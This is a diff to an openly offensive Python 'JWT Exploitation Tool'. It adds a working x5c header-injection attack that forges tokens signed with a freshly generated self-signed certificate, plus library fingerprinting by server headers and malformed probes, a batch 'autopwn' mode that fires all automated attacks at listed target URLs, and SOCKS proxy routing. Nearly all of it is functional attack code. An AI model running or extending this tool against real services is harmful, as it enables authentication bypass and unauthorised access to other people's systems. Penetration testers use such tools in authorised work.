@@ -16,10 +16,15 @@ import socket
 import http.server
 import tempfile
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.asymmetric import rsa
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
 from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
+from cryptography.x509 import (
+    CertificateBuilder, NameAttribute, Name, random_serial_number,
+    BasicConstraints,
+)
+from cryptography.x509.oid import NameOID
 from colorama import init, Fore, Style
 
 init(autoreset=True)
@@ -38,6 +43,28 @@ CONFIG = {
     "output_format":  "json", # --format: json | txt | md
     "findings":       [],     # accumulated findings for the report
 }
+
+
+def _validate_proxy(proxy_url):
+    """
+    Validate proxy URL and warn if SOCKS5 is requested but PySocks is missing.
+    Returns the proxy URL unchanged (requests handles the rest).
+    """
+    if not proxy_url:
+        return proxy_url
+    if proxy_url.lower().startswith("socks"):
+        try:
+            import socks  # noqa: F401  (PySocks)
+        except ImportError:
+            print(Fore.RED + "[!] SOCKS proxy requested but PySocks is not installed.")
+            print(Fore.RED + "    Run: pip install PySocks")
+            sys.exit(1)
+    allowed = ("http://", "https://", "socks4://", "socks5://", "socks5h://")
+    if not any(proxy_url.lower().startswith(p) for p in allowed):
+        print(Fore.RED + f"[!] Unrecognised proxy scheme in '{proxy_url}'.")
+        print(Fore.RED + "    Supported: http://, https://, socks4://, socks5://, socks5h://")
+        sys.exit(1)
+    return proxy_url
 
 
 def gold_gradient_text(text):
@@ -209,6 +236,7 @@ CVE_MAP = {
     "kid_ssrf":       ("N/A",            "8.6", "KID SSRF — server fetches key from attacker-controlled URL"),
     "null_sig":       ("N/A",            "7.5", "Null/stripped signature accepted by JWT library"),
     "weak_key":       ("N/A",            "8.8", "Weak or guessable HMAC signing secret"),
+    "x5c_inject":     ("CVE-2018-0114",  "9.8", "x5c self-signed certificate injection — server trusts embedded cert"),
 }
 
 # Maps attack name substrings → CVE_MAP keys (for print_result lookup)
@@ -226,6 +254,7 @@ _ATTACK_CVE_KEYS = {
     "kid ssrf":               "kid_ssrf",
     "null signature":         "null_sig",
     "weak signing":           "weak_key",
+    "x5c":                    "x5c_inject",
 }
 
 
@@ -256,6 +285,8 @@ def recommend_attacks(header, payload):
         tips.append(("HIGH",     "→ #6  KID Path Traversal  (kid header present)"))
         tips.append(("HIGH",     "→ #10 KID SQL Injection  (if kid queries a database)"))
         tips.append(("HIGH",     "→ #11 KID SSRF  (if kid is fetched as a URL)"))
+    if "x5c" in header or "x5u" in header:
+        tips.append(("CRITICAL", "→ #13 x5c Header Injection  (embedded cert — replace with self-signed)"))
     if alg in ("HS256", "HS384", "HS512"):
         tips.append(("HIGH",     "→ #3  Weak Key Brute Force  (HMAC — try rockyou / jwt-secrets wordlist)"))
     tips.append(("MEDIUM",   "→ #2  alg:none  (7 case variants — always worth a shot)"))
@@ -295,6 +326,10 @@ def decode_mode(token):
         print(Fore.RED    + f"  JKU        : {header['jku']}  ← JKU injection surface!")
     if "jwk" in header:
         print(Fore.RED    +  "  JWK        : embedded  ← JWK injection surface!")
+    if "x5c" in header:
+        print(Fore.RED    +  "  X5C        : embedded cert chain  ← x5c injection surface! (#13)")
+    if "x5u" in header:
+        print(Fore.RED    + f"  X5U        : {header['x5u']}  ← x5u URL injection surface!")
 
     exp = payload.get("exp")
     if exp:
@@ -1454,9 +1489,10 @@ _LIB_SIGNATURES = [
 
 def fingerprint_jwt_library(token, url=None):
     """
-    Send malformed tokens to the target to fingerprint the JWT library in use.
-    Match error message patterns in the HTTP response body to identify the library
-    and display known CVEs relevant to that version/library.
+    Fingerprint the JWT library by:
+      1. Inspecting response headers (Server, X-Powered-By, X-Runtime, etc.)
+      2. Sending malformed tokens and matching error body patterns
+    Displays the identified library + known CVEs.
     """
     if not url:
         if CONFIG.get("autopwn"):
@@ -1477,42 +1513,77 @@ def fingerprint_jwt_library(token, url=None):
     session.verify = CONFIG["ssl_verify"]
     timeout = CONFIG["timeout"]
 
-    # Malformed probes: each triggers a different error code path in most libs
-    probes = [
-        "definitely.not.a.valid.jwt",          # extra segments
-        "eyJhbGciOiJIUzI1NiJ9.bad-payload.",   # bad payload encoding
-        "X.Y",                                  # too few segments
-        "X.Y.Z.W",                              # too many segments
-    ]
-
     found_library = None
     found_cves    = []
+    probe         = "X.Y"  # default for recording
 
-    delivery_attempts = [
-        lambda tok: {"headers": {"Authorization": f"Bearer {tok}"}},
-        lambda tok: {"cookies": {"jwt": tok}},
-        lambda tok: {"headers": {"X-Auth-Token": tok}},
+    # ── STEP 1: Response header fingerprinting ─────────────────
+    # A plain GET (or the original token) reveals framework headers
+    # without triggering error-handling that might swallow error msgs.
+    _HDR_SIGS = [
+        # (header_name, value_substring, library_name, cves)
+        ("Server",          "WildFly",          "WildFly / JBoss (Java)",        ["CVE-2019-17195 (jjwt)", "CVE-2022-21449 (Java ECDSA)"]),
+        ("Server",          "JBoss",            "WildFly / JBoss (Java)",        ["CVE-2019-17195", "CVE-2022-21449"]),
+        ("Server",          "Jetty",            "Jetty (Java)",                  ["CVE-2022-21449 (Java ECDSA if using JJWT/jose4j)"]),
+        ("Server",          "Tomcat",           "Apache Tomcat (Java)",          ["CVE-2022-21449"]),
+        ("X-Powered-By",    "Express",          "jsonwebtoken (Node.js)",        ["CVE-2022-23529 (<9.0.0)", "CVE-2022-23540"]),
+        ("X-Powered-By",    "PHP",              "firebase/php-jwt (PHP)",        ["CVE-2021-46143 (<6.0.0)"]),
+        ("X-Powered-By",    "ASP.NET",          "System.IdentityModel (C#/.NET)",["no public JWT-specific CVEs — keep updated"]),
+        ("X-Runtime",       "ruby",             "ruby-jwt (Ruby)",               ["no critical public CVEs"]),
+        ("X-Generator",     "Django",           "PyJWT (Python/Django)",         ["CVE-2022-29217 (<2.4.0)"]),
+        ("X-Powered-By",    "Next.js",          "jsonwebtoken (Node.js)",        ["CVE-2022-23529", "CVE-2022-23540"]),
+        ("Via",             "gunicorn",         "PyJWT (Python)",                ["CVE-2022-29217"]),
+        ("Server",          "Kestrel",          "Microsoft.AspNetCore.Authentication (C#)", ["no critical JWT-specific public CVEs"]),
+        ("X-Powered-By",    "Flask",            "PyJWT (Python/Flask)",          ["CVE-2022-29217"]),
     ]
 
-    print(Fore.CYAN + f"[*] Probing {url} with {len(probes)} malformed tokens × {len(delivery_attempts)} delivery methods...")
+    print(Fore.CYAN + "[*] Step 1 — Inspecting response headers from a normal request...")
+    try:
+        resp0 = session.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
+        resp_headers_lower = {k.lower(): v.lower() for k, v in resp0.headers.items()}
+        for hdr_name, substr, lib_name, cves in _HDR_SIGS:
+            val = resp_headers_lower.get(hdr_name.lower(), "")
+            if substr.lower() in val:
+                found_library = lib_name
+                found_cves    = cves
+                print(Fore.GREEN + f"    ↳ Found '{hdr_name}: {resp0.headers.get(hdr_name)}' → {lib_name}")
+                break
+        if not found_library:
+            print(Fore.YELLOW + "    ↳ No definitive framework header detected — proceeding to body probing.")
+    except Exception as e:
+        print(Fore.YELLOW + f"    ↳ Header probe failed: {e}")
 
-    for probe in probes:
-        for delivery_fn in delivery_attempts:
-            kwargs = delivery_fn(probe)
-            try:
-                resp = session.get(url, timeout=timeout, **kwargs)
-                body = resp.text
-                for sig, lib_name, cves in _LIB_SIGNATURES:
-                    if sig.lower() in body.lower():
-                        found_library = lib_name
-                        found_cves    = cves
-                        break
-            except Exception:
-                continue
+    # ── STEP 2: Error body fingerprinting (malformed tokens) ───
+    if not found_library:
+        probes = [
+            "definitely.not.a.valid.jwt",
+            "eyJhbGciOiJIUzI1NiJ9.bad-payload.",
+            "X.Y",
+            "X.Y.Z.W",
+        ]
+        delivery_attempts = [
+            lambda tok: {"headers": {"Authorization": f"Bearer {tok}"}},
+            lambda tok: {"cookies": {"jwt": tok}},
+            lambda tok: {"headers": {"X-Auth-Token": tok}},
+        ]
+        print(Fore.CYAN + f"[*] Step 2 — Sending {len(probes)} malformed probes × {len(delivery_attempts)} delivery methods...")
+        for probe in probes:
+            for delivery_fn in delivery_attempts:
+                kwargs = delivery_fn(probe)
+                try:
+                    resp = session.get(url, timeout=timeout, **kwargs)
+                    body = resp.text
+                    for sig, lib_name, cves in _LIB_SIGNATURES:
+                        if sig.lower() in body.lower():
+                            found_library = lib_name
+                            found_cves    = cves
+                            break
+                except Exception:
+                    continue
+                if found_library:
+                    break
             if found_library:
                 break
-        if found_library:
-            break
 
     print()
     if found_library:
@@ -1521,7 +1592,6 @@ def fingerprint_jwt_library(token, url=None):
         for cve in found_cves:
             print(Fore.RED + f"      ✦  {cve}")
         print(Fore.YELLOW + "\n[*] Recommendation: Run targeted attacks for the CVEs listed above.")
-        # Record as a finding
         CONFIG["findings"].append({
             "attack":        "Library Fingerprint",
             "token":         probe,
@@ -1538,6 +1608,91 @@ def fingerprint_jwt_library(token, url=None):
 
     print(Fore.CYAN + "═" * 64)
 
+
+# ──────────────────────────────────────────────────────────────
+#  ATTACK #13 — x5c HEADER INJECTION
+# ──────────────────────────────────────────────────────────────
+
+def attack_x5c_injection(token, url=None):
+    """
+    x5c (X.509 Certificate Chain) Header Injection.
+
+    Some JWT libraries trust the certificate embedded in the x5c header to
+    verify the signature instead of validating it against a trusted CA.
+    We generate a fresh self-signed RSA cert, embed it in the header, and
+    sign the token with the matching private key — giving us full control
+    over the signing material while the server happily trusts our cert.
+
+    Affected: older versions of node-jose, jose4j, some Go JWT libs.
+    Related:  CVE-2018-0114 family (trusting header-supplied key material).
+    """
+    decoded_payload = decode_token(token)
+    original_header = get_header(token)
+
+    print(Fore.CYAN + "\n[+] Edit JWT Payload for x5c injection:")
+    modified_payload = interactive_edit_dict("Token payload", decoded_payload)
+
+    # 1. Generate a fresh RSA-2048 keypair for this attack
+    print(Fore.CYAN + "[*] Generating self-signed X.509 certificate for x5c injection...")
+    priv_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048,
+        backend=default_backend(),
+    )
+    pub_key = priv_key.public_key()
+
+    # 2. Build a plausible-looking self-signed cert
+    subject = issuer = Name([
+        NameAttribute(NameOID.COUNTRY_NAME,             "US"),
+        NameAttribute(NameOID.ORGANIZATION_NAME,        "Acme Corp"),
+        NameAttribute(NameOID.COMMON_NAME,              "acme.example.com"),
+    ])
+    cert = (
+        CertificateBuilder()
+        .subject_name(subject)
+        .issuer_name(issuer)
+        .public_key(pub_key)
+        .serial_number(random_serial_number())
+        .not_valid_before(datetime.datetime.utcnow() - datetime.timedelta(days=1))
+        .not_valid_after(datetime.datetime.utcnow()  + datetime.timedelta(days=3650))
+        .add_extension(BasicConstraints(ca=True, path_length=None), critical=True)
+        .sign(priv_key, hashes.SHA256(), default_backend())
+    )
+
+    # 3. DER-encode and base64-encode for the x5c array (no padding per RFC 7517)
+    der_bytes   = cert.public_bytes(serialization.Encoding.DER)
+    x5c_value   = base64.b64encode(der_bytes).decode()
+
+    # 4. Build header: keep original claims, inject x5c, switch to RS256
+    forged_header = dict(original_header)
+    forged_header["alg"] = "RS256"
+    forged_header["x5c"] = [x5c_value]
+    # Remove jwk/jku/kid if present — they'd conflict
+    for k in ("jwk", "jku", "kid"):
+        forged_header.pop(k, None)
+
+    # 5. Sign with our private key (matches the embedded cert's public key)
+    priv_pem = priv_key.private_bytes(
+        encoding=serialization.Encoding.PEM,
+        format=serialization.PrivateFormat.TraditionalOpenSSL,
+        encryption_algorithm=serialization.NoEncryption(),
+    )
+    try:
+        forged_token = jwt.encode(
+            modified_payload,
+            priv_pem,
+            algorithm="RS256",
+            headers=forged_header,
+        )
+        print_result(
+            "x5c Header Injection (self-signed cert trusted by server)",
+            forged_token,
+            modified_payload,
+            forged_header,
+        )
+        check_url(forged_token, url)
+    except Exception as e:
+        print(Fore.RED + f"[-] x5c injection error: {e}")
 
 
 def run_autopwn(token, url, wordlist=None):
@@ -1568,6 +1723,7 @@ def run_autopwn(token, url, wordlist=None):
         ("KID SSRF",                    attack_kid_ssrf),
         ("ES256 Psychic Signature",     attack_es256_psychic_signature),
         ("Library Fingerprint",         fingerprint_jwt_library),
+        ("x5c Header Injection",        attack_x5c_injection),
     ]
     if wordlist:
         autopwn_attacks.append(
@@ -1586,18 +1742,96 @@ def run_autopwn(token, url, wordlist=None):
     print(Fore.YELLOW + f"\n{chr(9552) * 64}")
     print(Fore.YELLOW + "[AUTOPWN] Scan complete.")
     print(Fore.YELLOW + "[AUTOPWN] Skipped (require manual input):")
-    print(Fore.YELLOW + "   \u21b7 Algorithm Confusion  (needs key file or second token for sig2n)")
+    print(Fore.YELLOW + "   ↷ Algorithm Confusion  (needs key file or second token for sig2n)")
     print(Fore.YELLOW + f"{chr(9552) * 64}\n")
+
+
+# ──────────────────────────────────────────────────────────────
+#  BATCH MODE ENGINE
+# ──────────────────────────────────────────────────────────────
+
+def _parse_batch_line(line):
+    """
+    Parse one line from a batch file.
+    Accepted formats:
+        token                    → (token, None)
+        token::https://url.com   → (token, url)
+        token https://url.com    → (token, url)   (space separated)
+    Returns None for blank lines and comment lines starting with #.
+    """
+    line = line.strip()
+    if not line or line.startswith("#"):
+        return None
+    if "::" in line:
+        parts = line.split("::", 1)
+        return parts[0].strip(), parts[1].strip() or None
+    parts = line.split(None, 1)
+    if len(parts) == 2 and parts[1].startswith("http"):
+        return parts[0], parts[1]
+    return line, None
+
+
+def run_batch(batch_file, wordlist=None):
+    """
+    Read a batch file of tokens (one per line) and run full autopwn on each.
+    Lines can be:
+        <token>
+        <token>::<url>
+        <token> <url>
+        # comment lines are skipped
+    All findings accumulate into CONFIG['findings'] for a single combined report.
+    """
+    try:
+        with open(batch_file, encoding="utf-8") as fh:
+            raw_lines = fh.readlines()
+    except FileNotFoundError:
+        print(Fore.RED + f"[!] Batch file not found: {batch_file}")
+        sys.exit(1)
+
+    entries = [_parse_batch_line(l) for l in raw_lines]
+    entries = [e for e in entries if e is not None]
+
+    if not entries:
+        print(Fore.RED + "[!] Batch file is empty or contains only comments.")
+        sys.exit(1)
+
+    print(Fore.YELLOW + "\n" + "═" * 64)
+    print(Fore.YELLOW + f"  📋  BATCH MODE — {len(entries)} token(s) loaded from '{batch_file}'")
+    print(Fore.YELLOW + "═" * 64)
+
+    for idx, (token, url) in enumerate(entries, 1):
+        print(Fore.CYAN + f"\n{'─'*64}")
+        print(Fore.CYAN + f"  [BATCH {idx}/{len(entries)}]  Token: {token[:40]}...")
+        if url:
+            print(Fore.CYAN + f"               URL:   {url}")
+        print(Fore.CYAN + f"{'─'*64}")
+
+        # Reset per-token state that shouldn't bleed between items
+        CONFIG["original_token"] = token
+
+        # Run secrets scan + recommender silently per token
+        scan_token_secrets(token)
+        hdr = get_header(token)
+        pay = decode_token(token)
+        recommend_attacks(hdr, pay)
+        print()
+
+        run_autopwn(token, url, wordlist=wordlist)
+
+    confirmed = sum(1 for f in CONFIG["findings"] if f.get("verified"))
+    print(Fore.YELLOW + "\n" + "═" * 64)
+    print(Fore.YELLOW + f"  BATCH COMPLETE  |  {len(entries)} tokens  |  {len(CONFIG['findings'])} tokens generated  |  {confirmed} confirmed accepted")
+    print(Fore.YELLOW + "═" * 64)
 
 
 def main():
     print_banner()
 
     parser = argparse.ArgumentParser(description="JWT Exploitation Tool")
-    parser.add_argument("token",              help="JWT token to test")
+    parser.add_argument("token",              nargs="?", default=None, help="JWT token to test (omit when using --batch)")
     parser.add_argument("-w", "--wordlist",   help="Wordlist path (for weak signing key brute force)")
     parser.add_argument("--url",              help="Target endpoint URL to test tokens against")
-    parser.add_argument("--proxy",            help="Proxy URL for traffic routing (e.g. http://127.0.0.1:8080)")
+    parser.add_argument("--proxy",            help="Proxy URL: http://host:port  |  socks5h://host:port  (socks5h routes DNS through proxy too; needs PySocks)")
     parser.add_argument("--no-ssl-verify",    action="store_true", help="Disable SSL certificate verification (useful for self-signed certs)")
     parser.add_argument("--timeout",          type=int, default=10, metavar="SEC", help="HTTP request timeout in seconds (default: 10)")
     parser.add_argument("--autopwn",          action="store_true", help="Run ALL automatable attacks non-interactively and test each against --url")
@@ -1605,21 +1839,33 @@ def main():
     parser.add_argument("--strip-exp",        action="store_true", help="Remove nbf/iat and push exp 10 years forward before signing every token")
     parser.add_argument("--hashcat",          action="store_true", help="Use GPU hashcat for brute force instead of Python threaded mode")
     parser.add_argument("--decode",           action="store_true", help="Decode and analyse the token without attacking (recon mode)")
+    parser.add_argument("--batch",            metavar="FILE", help="Batch file: one token (or token::url) per line — runs autopwn on each")
     parser.add_argument("-o", "--output",     metavar="FILE", help="Save report to this file after the session")
     parser.add_argument("--format",           choices=["json", "txt", "md"], default="json", metavar="FMT", help="Report format: json (default), txt, or md")
     args = parser.parse_args()
 
+    # Require either token or --batch
+    if not args.token and not args.batch:
+        parser.error("provide a token positional argument or use --batch FILE")
+
     # Populate global config from parsed args
-    CONFIG["proxy"]          = args.proxy
+    CONFIG["proxy"]          = _validate_proxy(args.proxy)
     CONFIG["ssl_verify"]     = not args.no_ssl_verify
     CONFIG["timeout"]        = args.timeout
-    CONFIG["original_token"] = args.token
-    CONFIG["autopwn"]        = args.autopwn
+    CONFIG["original_token"] = args.token or ""
+    CONFIG["autopwn"]        = True if args.batch else args.autopwn
     CONFIG["escalate_role"]  = args.escalate_role
     CONFIG["strip_exp"]      = args.strip_exp
     CONFIG["use_hashcat"]    = args.hashcat
     CONFIG["output_file"]    = args.output
     CONFIG["output_format"]  = args.format
+
+    # ── BATCH MODE ───────────────────────────────────────────────
+    if args.batch:
+        run_batch(args.batch, wordlist=args.wordlist)
+        if CONFIG["output_file"]:
+            save_report(CONFIG["output_file"], CONFIG["output_format"])
+        return
 
     # Always scan payload for embedded secrets on load
     scan_token_secrets(args.token)
@@ -1655,6 +1901,7 @@ def main():
         "10": ("KID SQL Injection",                               attack_kid_sqli),
         "11": ("KID SSRF",                                        attack_kid_ssrf),
         "12": ("JWT Library Fingerprinting",                      fingerprint_jwt_library),
+        "13": ("x5c Header Injection",                            attack_x5c_injection),
     }
 
     print(Fore.CYAN + "[*] Choose an attack method:")
